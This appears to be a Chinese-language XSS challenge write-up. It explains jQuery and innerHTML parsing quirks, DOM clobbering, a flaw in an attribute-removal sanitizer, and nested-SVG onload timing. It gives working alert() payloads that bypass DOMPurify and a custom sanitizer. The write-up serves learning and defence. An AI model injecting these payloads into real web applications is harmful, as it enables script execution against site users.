&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;setTimeout(_ =&amp;gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $(&amp;#x27;#status&amp;#x27;).remove()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    notify ? ($(&amp;#x27;#notify&amp;#x27;).html(html)) : &amp;#x27;&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $(&amp;#x27;#meme-code&amp;#x27;).text(template)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;, 1000)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;两种解析 html 的方式:&lt;strong&gt;jquery.html&amp;amp;innerhtml&lt;/strong&gt;。 &lt;code&gt;innerHTML&lt;/code&gt;  是原生 js 的写法， &lt;code&gt;Jqury.html()&lt;/code&gt;  也是调用原生的 innerHTML 方法，但是加了自己的解析规则&lt;/p&gt;
&lt;p&gt;对于 innerHTML：模拟浏览器自动补全标签，不处理非法标签。同时， &lt;code&gt;&amp;lt;style&amp;gt;&lt;/code&gt;  标签中不允许存在子标签 (style 标签最初的设计理念就不能用来放子标签)，如果存在会被当作 text 解析。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;style&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;style/&amp;gt;&amp;lt;script&amp;gt;alert(1337)//&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/style&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;对于 &lt;code&gt;Jqury.html()&lt;/code&gt; ，最终对标签的处理是在 &lt;code&gt;htmlPrefilter()&lt;/code&gt;  中实现&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;rxhtmlTag = /&amp;lt;(?!area|br|col|embed|hr|img|input|link|meta|param)(([a-z][^/&amp;gt;x20trnf]*)[^&amp;gt;]*)/&amp;gt;/gi&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;jQuery.extend( &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    htmlPrefilter: function( html ) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        return html.replace( rxhtmlTag, &amp;quot;&amp;lt;$1&amp;gt;&amp;lt;/$2&amp;gt;&amp;quot; );&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ...&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tmp.innerHTML = wrap[ 1 ] + jQuery.htmlPrefilter( elem ) + wrap[ 2 ];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;此处正则匹配完的结果$1和$2均为style&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这个正则表达式在匹配 &lt;code&gt;&amp;lt;*/&amp;gt;&lt;/code&gt;  之后会重新生成一对标签 (区别于直接调用 innerHTML)&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;style&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;style&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/style&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;alert(1337)//&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;前置知识 2&lt;/p&gt;
&lt;p&gt;首先尝试用 DOM-clobbering 创造一个 id 为 &lt;code&gt;notify&lt;/code&gt;  的变量，尝试覆盖 notify 使其变为真，走到为真的条件中，但是这种方式不允许覆盖已经存在的变量。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;img id=notify&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;img src=&amp;quot;&amp;quot; onerror=&amp;quot;memeGen(notify)&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;const memeGen = (notify) =&amp;gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    consol.log(notify);  //false&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;let notify = false;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;但我们可以通过 name 的局部作用域覆盖 notify&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;img name=notify&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;此时notify为真&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;前置知识 3：&lt;/p&gt;
&lt;p&gt;JS 局部作用域和全局作用域&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;img src=&amp;quot;&amp;quot; onerror=&amp;quot;console.log(nickname)&amp;quot;&amp;gt; //pig&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;img src=&amp;quot;&amp;quot; onerror=&amp;quot;var nickname=&amp;#x27;dog&amp;#x27;;console.log(nickname)&amp;quot;&amp;gt; //dog&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;window.document.nickname = &amp;#x27;pig&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;window.nickname = &amp;#x27;cat&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;在 document.write 中 notify 为 false，但通过 img 的局部作用域覆盖了 notify&lt;/p&gt;
&lt;p&gt;在 memeTemplate 中有如下语句：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;div class=&amp;quot;meme-card&amp;quot;&amp;gt;&amp;lt;img src=&amp;quot;$&amp;#123;img&amp;#125;&amp;quot;&amp;gt;&amp;lt;h1&amp;gt;$&amp;#123;text&amp;#125;&amp;lt;/h1&amp;gt;&amp;lt;/div&amp;gt;&lt;/code&gt; )&lt;/p&gt;
&lt;p&gt;我们可以将局部作用域的 img 放入 text 中同时利用 jQuery 的解析绕过 dompurify 的过滤&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?img=https://i.imgur.com/PdbDexI.jpg&amp;amp;text=&amp;lt;img%20name=notify&amp;gt;&amp;lt;style&amp;gt;&amp;lt;style/&amp;gt;&amp;lt;script&amp;gt;alert()//&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;执行之后写入 memecode，div 中 script 标签被解析，完成弹窗&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221012162102961.png&#34; alt=&#34;image-20221012162102961&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;div id=&amp;quot;notify&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;lt;div class=&amp;quot;alert alert-warning&amp;quot; role=&amp;quot;alert&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&amp;lt;b&amp;gt;Meme&amp;lt;/b&amp;gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		created from &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&amp;lt;img name=&amp;quot;notify&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&amp;lt;style&amp;gt;&amp;lt;style&amp;gt;&amp;lt;/style&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&amp;lt;script&amp;gt;alert()//&amp;lt;/style&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;lt;/div&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;svg深入研究&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#svg深入研究&#34;&gt;#&lt;/a&gt; &amp;lt;svg&amp;gt; 深入研究&lt;/h2&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;variable constant_&#34;&gt;data&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;decodeURIComponent&lt;/span&gt;(location.hash.&lt;span class=&#34;title function_ invoke__&#34;&gt;substr&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;variable constant_&#34;&gt;root&lt;/span&gt; = document.&lt;span class=&#34;title function_ invoke__&#34;&gt;createElement&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;div&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;root.innerHTML = data;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (let el of root.&lt;span class=&#34;title function_ invoke__&#34;&gt;querySelectorAll&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;*&amp;#x27;&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (let attr of el.attributes) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;         el.&lt;span class=&#34;title function_ invoke__&#34;&gt;removeAttribute&lt;/span&gt;(name)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;document.body.&lt;span class=&#34;title function_ invoke__&#34;&gt;appendChild&lt;/span&gt;(root)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;HTML5 中 innerHtml 不执行插入的&lt;script&gt;标签&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;移除元素后，元素向前补，但指针向后移，导致没有完全移除所有元素&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;exp:  &lt;code&gt;&amp;lt;img a src=&#39;a&#39; b onerror=alert(1)&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;因此我们一般不在同一个数组边循环边删除&lt;/p&gt;
&lt;p&gt;修复：先追加到数组中，在移除，即不要在源数组上操作&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (let el of root.&lt;span class=&#34;title function_ invoke__&#34;&gt;querySelectorAll&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;*&amp;#x27;&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     let attrs = []&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (let attr of el.attributes) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;         attrs.&lt;span class=&#34;title function_ invoke__&#34;&gt;push&lt;/span&gt;(attr.name)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (let name of attrs) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;         el.&lt;span class=&#34;title function_ invoke__&#34;&gt;removeAttribute&lt;/span&gt;(name)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;document.body.&lt;span class=&#34;title function_ invoke__&#34;&gt;appendChild&lt;/span&gt;(root); &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;使用以上修复后&lt;/p&gt;
&lt;p&gt;1. 别进循环&lt;/p&gt;
&lt;p&gt;2. 进循环别删有用数据&lt;/p&gt;
&lt;p&gt;method 1.(利用 html 页面渲染的竞争时间)&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;svg&amp;gt;&amp;lt;svg onload=alert(1)&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cueXVxdWUuY29tL2F0dGFjaG1lbnRzL3l1cXVlLzAvMjAyMi9tZC8yNzU5Mjg1LzE2NDM2MDcyNzk4NTEtY2UyNDFlNTItZDM4ZS00NWRjLTllZGMtODkxMTM2YTQ5OGI4Lm1k&#34;&gt;📎svg 的深度利用来绕过 waf.md&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;1.1  &lt;code&gt;&amp;lt;img src=&#39;1&#39; onerror=&amp;quot;alert(1)&amp;quot;&amp;gt;&lt;/code&gt;  失败原因&lt;/p&gt;
&lt;p&gt;那么很明显， &lt;code&gt;alert(1)&lt;/code&gt;  是在页面上 script 标签中的代码全部执行完毕以后才被调用的。这里涉及到浏览器渲染的另外一部分内容： &lt;strong&gt;在 DOM 树构建完成以后，就会触发&lt;/strong&gt; &lt;code&gt;DOMContentLoaded&lt;/code&gt;  事件，接着加载脚本、图片等外部文件，全部加载完成之后触发 &lt;code&gt;load&lt;/code&gt; &lt;strong&gt; 事件&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;页面的 JS 执行是会阻塞 DOM 树构建的。&lt;strong&gt;所以总的来说，在 script 标签内的 JS 执行完毕以后，DOM 树才会构建完成，接着才会加载图片，然后发现加载内容出错才会触发&lt;/strong&gt; &lt;code&gt;error&lt;/code&gt; &lt;strong&gt; 事件&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;由于 js 阻塞 dom 树，一直到 js 语句执行结束后，才可以引入 img，此时 img 的属性已经被 sanitizer 清除了，自然也不可能执行事件代码了。&lt;/p&gt;
&lt;p&gt;1.2&lt;svg&gt;&lt;svg onload=alert(1)&gt; 可以弹窗原因&lt;/p&gt;
&lt;p&gt;两个 svg 时，直接弹出了窗口，点击确定以后，调试器才会走到下一行代码，没有执行移除属性的代码。而且，这个地方如果只有一个 &lt;code&gt;&amp;lt;svg onload=alert(1)&amp;gt;&lt;/code&gt; ，那么结果将同 img 一样，直到 script 标签结束以后才能执行相关的代码，这样的代码放到挑战里也将失败&lt;/p&gt;
&lt;p&gt;当我们没有正确闭合标签的时候，如 &lt;code&gt;&amp;lt;svg&amp;gt;&amp;lt;svg&amp;gt;&lt;/code&gt; ，就可能调用到 &lt;code&gt;PopAll&lt;/code&gt;  来清理；而正确闭合的标签就可能调用到其他出栈函数并调用到 &lt;code&gt;PopCommon&lt;/code&gt; 。这两个函数有一个共同点，都会调用栈中元素的 &lt;code&gt;FinishParsingChildren&lt;/code&gt;  函数。这个函数用于处理子节点解析完毕以后的工作。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;FinishParsingChildren&lt;/code&gt;  有一个非常明显的判断 &lt;code&gt;IsOutermostSVGSVGElement&lt;/code&gt; ，如果是最外层的 svg 则直接返回。&lt;/p&gt;
&lt;p&gt;最外层 svg 的 &lt;code&gt;load&lt;/code&gt;  事件由 &lt;code&gt;LocalDOMWindow::dispatchWindowLoadEvent&lt;/code&gt;  触发；而其他 svg 的 &lt;code&gt;load&lt;/code&gt;  事件则在达到结束标记的时候触发。&lt;/p&gt;
&lt;p&gt;先决条件 在于 svg 不能最外层， onload 必须保证不是最外层属性，不是最外层 onload 会在 innerHTML 之前执行&lt;/p&gt;
&lt;p&gt;当没有过滤代码时：&amp;lt;svg onload=console.log (“svg0”)&amp;gt;&amp;lt;svg onload=console.log (“svg1”)&amp;gt;&amp;lt;svg onload=console.log (“svg2”)&amp;gt;&lt;/p&gt;
&lt;p&gt;触发顺序为&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;svg2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;svg1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;DOMContentLoaded&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;svg0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;load&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;套嵌的 svg 之所以成功，是因为当页面为 &lt;code&gt;root.innerHtml&lt;/code&gt;  赋值的时候浏览器进入 DOM 树构建过程；在这个过程中&lt;strong&gt;会触发非最外层 svg 标签的 &lt;code&gt;load&lt;/code&gt;  事件，最终成功执行代码&lt;/strong&gt;。所以，sanitizer 执行的时间点在这之后，无法影响我们的 payload。&lt;/p&gt;
&lt;p&gt;1.3&lt;svg onload=alert(1)&gt; 失败原因&lt;/p&gt;
&lt;p&gt;这里有一个非常明显的判断 &lt;code&gt;IsOutermostSVGSVGElement&lt;/code&gt; ，如果是最外层的 svg 则直接返回。&lt;/p&gt;
